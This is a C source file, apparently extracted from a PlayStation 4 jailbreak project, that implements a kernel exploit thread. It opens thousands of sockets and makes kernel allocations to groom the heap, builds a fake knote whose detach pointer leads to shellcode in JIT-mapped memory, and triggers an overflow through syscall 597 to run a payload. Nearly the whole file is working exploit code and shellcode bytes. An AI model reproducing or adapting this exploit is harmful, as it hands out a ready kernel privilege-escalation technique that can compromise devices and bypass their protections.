
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint8_t ;
typedef int uint64_t ;
typedef int trampolinecode ;
struct knote {struct filterops* kn_fop; } ;
struct filterops {void* f_detach; } ;
typedef int int64_t ;


 int AF_INET ;
 int MAP_ANONYMOUS ;
 int MAP_PRIVATE ;
 int MAP_SHARED ;
 int MAP_TYPE ;
 int PAGE_SIZE ;
 int PROT_CPU_EXEC ;
 int PROT_CPU_READ ;
 int PROT_CPU_WRITE ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SOCK_STREAM ;
 int kernelAllocation (int,int) ;
 int kernelFree (int) ;
 int memcpy (void*,int*,int) ;
 void* mmap (int *,int,int,int,int,int ) ;
 int munmap (int*,int) ;
 scalar_t__ payload ;
 int printfsocket (char*,...) ;
 int sceKernelJitCreateAliasOfSharedMemory (int,int,int*) ;
 int sceKernelJitCreateSharedMemory (int ,int,int,int*) ;
 int sceNetSocket (char*,int ,int ,int ) ;
 int sceNetSocketClose (int) ;
 int syscall (int,int,int*,int*) ;

void *exploitThread(void *none) {
 printfsocket("[+] Entered exploitThread\n");

 uint64_t bufferSize = 0x8000;
 uint64_t overflowSize = 0x8000;
 uint64_t copySize = bufferSize + overflowSize;


 uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

 uint8_t *mapping = mmap(((void*)0), mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 munmap(mapping + mappingSize, PAGE_SIZE);

 uint8_t *buffer = mapping + mappingSize - copySize;

 int64_t count = (0x100000000 + bufferSize) / 4;


 struct knote kn;
 struct filterops fo;
 struct knote **overflow = (struct knote **)(buffer + bufferSize);
 overflow[2] = &kn;
 kn.kn_fop = &fo;


 void *trampw = ((void*)0);
 void *trampe = ((void*)0);
 int executableHandle;
 int writableHandle;
 uint8_t trampolinecode[] = {
  0x58,
  0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF,
  0x50,
  0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE,
  0xFF, 0xE0
 };


 sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
 sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);


 trampe = mmap(((void*)0), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
 trampw = mmap(((void*)0), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);


 memcpy(trampw, trampolinecode, sizeof(trampolinecode));
 *(void **)(trampw + 14) = (void *)payload;


 fo.f_detach = trampe;


 int sockets[0x2000];
 int allocation[50], m = 0, m2 = 0;
 int fd = (bufferSize - 0x800) / 8;

 printfsocket("[+] Creating %d sockets\n", fd);


 for(int i = 0; i < 0x2000; i++) {
  sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
  if(sockets[i] >= fd) {
   sockets[i + 1] = -1;
   break;
  }
 }


 for(int i = 0; i < 50; i++) {
  allocation[i] = kernelAllocation(bufferSize, fd);
  printfsocket("[+] allocation = %llp\n", allocation[i]);
 }


 m = kernelAllocation(bufferSize, fd);
 m2 = kernelAllocation(bufferSize, fd);
 kernelFree(m);


 int result = syscall(597, 1, mapping, &count);
 printfsocket("[+] Result: %d\n", result);


 printfsocket("[+] Freeing m2\n");
 kernelFree(m2);


 for(int i = 0; i < 0x2000; i++) {
  if(sockets[i] == -1)
   break;
  sceNetSocketClose(sockets[i]);
 }


 for(int i = 0; i < 50; i++) {
  kernelFree(allocation[i]);
 }


 munmap(mapping, mappingSize);

 return ((void*)0);
}
